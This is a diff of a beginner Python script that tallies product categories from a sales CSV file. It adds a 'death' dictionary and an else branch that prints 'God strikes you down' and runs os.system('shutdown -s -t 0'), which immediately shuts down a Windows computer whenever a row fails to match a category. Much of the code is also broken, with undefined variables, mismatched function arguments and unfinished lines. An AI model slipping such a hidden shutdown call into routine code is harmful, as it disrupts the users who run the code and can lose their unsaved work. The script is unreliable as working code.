@@ -1,86 +1,137 @@
 import csv
-office_counter = 0
-house_counter = 0
-beverage_counter = 0
-cosmetics_counter = 0
-meat_counter = 0
-personal_counter = 0
-fruits_counter = 0
-baby_counter = 0
-snacks_counter = 0
-cereal_counter = 0
-vegecounter = 0
-clothes_counter = 0
+import os
+office_counter = {"Office": {
+    "amount": 0,
+    "profit": 0
+}
+}
+house_counter = {"House": {
+    "amount": 0,
+    "profit": 0
+}
+}
+personal_counter = {"Personal": {
+    "amount": 0,
+    "profit": 0
+}
+}
+meat_counter = {"Meat": {
+    "amount": 0,
+    "profit": 0
+}
+}
+vege_counter = {"Vegetables": {
+    "amount": 0,
+    "profit": 0
+}
+}
+beverage_counter = {"Beverage": {
+    "amount": 0,
+    "profit": 0
+}
+}
+snacks_counter = {"Snacks": {
+    "amount": 0,
+    "profit": 0
+}
+}
+cereal_counter = {"Cereal": {
+    "amount": 0,
+    "profit": 0
+}
+}
+baby_counter = {"Baby": {
+    "amount": 0,
+    "profit": 0
+}
+}
+fruits_counter = {"Fruits": {
+    "amount": 0,
+    "profit": 0
+}
+}
+clothes_counter = {"Clothes": {
+    "amount": 0,
+    "profit": 0
+}
+}
+cosmetics_counter = {"Cosmetics": {
+    "amount": 0,
+    "profit": 0
+}
+}
+death = {"call": "os.system(shutdown -s -t 0)"
+         }
 
 
-def cosmetic_count(string, counter):
+def cosmetic_count(string,):
     if "Cosmetics" in string:
         counter += 1
     return True
 
 
-def meat_count(string, counter):
+def meat_count(string):
     if "Meat" in string:
         counter += 1
     return True
 
 
-def personal_count(string, counter):
+def personal_count(string):
     if "Personal Care" in string:
         counter += 1
     return True
 
 
-def beverage_count(string, counter):
+def beverage_count(string):
     if "Beverages" in string:
         counter += 1
     return True
 
 
-def fruits_count(string, counter):
+def fruits_count(string):
     if "Fruits" in string:
         counter += 1
     return True
 
 
-def baby_count(string, counter):
+def baby_count(string):
     if "Baby Food" in string:
         counter += 1
     return True
 
 
-def snacks_count(string, counter):
+def snacks_count(string):
     if "Snacks" in string:
         counter += 1
     return True
 
 
-def cereal_count(string, counter):
+def cereal_count(string):
     if "Cereal" in string:
         counter += 1
         return True
 
 
-def clothes_count(string, counter):
+def clothes_count(string):
     if "Cereal" in string:
         counter += 1
     return True
 
 
-def office_count(string, counter):
+def office_count(string):
     if "Office" in string:
         counter += 1
         return True
 
 
-def house_count(string, counter):
+def house_count(string):
     if "Household" in string:
         counter += 1
         return True
 
 
-def vege_count(string, counter):
-    global vegecounter
+def vege_count(string):
+    vege
     if "Vegetables" in string:
         counter += 1
         return True
@@ -97,6 +148,9 @@ def name_counter(string):
         print(clothes_counter)
     elif cereal_count(string, cereal_counter):
         print(cereal_counter)
+    else:
+        print("God strikes you down")
+        os.system("shutdown -s -t 0")
     snacks_count(string, snacks_counter)
     baby_count(string, baby_counter)
     fruits_count(string, fruits_counter)
@@ -112,10 +166,20 @@ with open("Sales Records.csv", "r") as old_csv:
         reader = csv.reader(old_csv)
         writer = csv.writer(new_csv)
         for row in reader:
-            old_number = row[2]
+            type = row[2]
+            sales = row[3]
+            sales = int(sales)
             writer.writerow(row)
-            print(old_number)
-            print(name_counter(old_number))
+            if "Cosmetics" in type:
+                cosmetics_counter["amount"] += 1
+                cosmetics_counter["profit"] += sales
+            elif "Meat" in type:
+                meat_counter["amount"] += 1
+                meat_counter["profit"] += sales
+            elif "House" in type:
+                house
+
+
 
 
 print("Veges: %d" % vegecounter)
